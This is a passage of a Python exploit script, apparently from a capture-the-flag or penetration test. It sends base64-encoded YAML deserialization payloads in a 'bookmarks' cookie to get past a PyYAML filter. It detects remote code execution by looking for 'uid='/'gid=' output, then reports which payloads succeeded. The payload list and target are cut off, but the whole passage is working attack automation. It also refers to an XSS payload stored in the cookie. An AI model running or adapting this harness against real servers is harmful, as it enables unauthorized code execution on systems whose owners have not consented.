session = requests.Session()
session.headers.update({'User-Agent': 'Mozilla/5.0'})

print("Starting PyYAML filter bypass tests...")
print(f"Testing {len(payloads)} payloads against {target}")
print("="*60)

results = {
    "bypassed": [],
    "blocked": [],
    "errors": []
}

for i, test in enumerate(payloads, 1):
    try:
        # Base64 encode the YAML payload
        yaml_data = test["yaml"]
        encoded = base64.b64encode(yaml_data.encode()).decode()
        
        # Set cookie and make request
        cookies = {"bookmarks": encoded}
        
        resp = session.get(target, cookies=cookies, timeout=10)
        
        # Analyze response
        status = resp.status_code
        has_rce = "uid=" in resp.text.lower() or "root" in resp.text.lower() or "gid=" in resp.text.lower()
        cmd_output = None
        
        # Look for command output
        if has_rce:
            # Extract uid line
            match = re.search(r'(uid=[\d\(\)]+[^\n]*)', resp.text, re.I)
            if match:
                cmd_output = match.group(1)
        
        result = {
            "id": i,
            "name": test["name"],
            "status": status,
            "length": len(resp.text),
            "rce_detected": has_rce,
            "cmd_output": cmd_output,
            "payload": yaml_data[:150] + "..." if len(yaml_data) > 150 else yaml_data
        }
        
        if status == 500:
            results["blocked"].append(result)
            print(f"\n[{i}] BLOCKED (500) - {test['name']}")
        elif status == 200:
            if has_rce:
                results["bypassed"].append(result)
                print(f"\n[{i}] BYPASSED + RCE! - {test['name']}")
                print(f"    Status: {status} | Length: {len(resp.text)}B")
                print(f"    CMD OUTPUT: {cmd_output}")
                # Print partial response for analysis
                print(f"\n    Response snippet (first 800 chars):")
                print(resp.text[:800])
            else:
                results["errors"].append(result)
                print(f"\n[{i}] BYPASSED (200) but no RCE - {test['name']}")
                print(f"    Status: {status} | Length: {len(resp.text)}B")
                # Check if response contains 'script>alert(1)</script' which indicates existing cookie data
                if "alert(1)" in resp.text:
                    print("    Note: Response contains existing XSS payload from stored cookie")
        else:
            results["errors"].append(result)
            print(f"\n[{i}] UNEXPECTED - {test['name']}")
            print(f"    Status: {status} | Length: {len(resp.text)}B")
            print(f"    Response (first 400 chars): {resp.text[:400]}")
            
    except Exception as e:
        print(f"\n[{i}] EXCEPTION - {test['name']}: {str(e)}")
        results["errors"].append({"id": i, "name": test["name"], "error": str(e)})

print("\n" + "="*60)
print("SUMMARY")
print("="*60)
print(f"Bypassed with RCE: {len([r for r in results['bypassed'] if r.get('cmd_output')])}")
print(f"Bypassed (200 OK) but no RCE: {len([r for r in results['errors'] if r.get('status') == 200])}")
print(f"Blocked (500): {len(results['blocked'])}")
print(f"Errors/Other: {len([r for r in results['errors'] if r.get('status') != 200])}")

if results["bypassed"]:
    print("\n[SUCCESSFUL BYPASSES WITH RCE]")
    for r in results["bypassed"]:
        print(f"  {r['id']}. {r['name']}: {r['cmd_output']}")
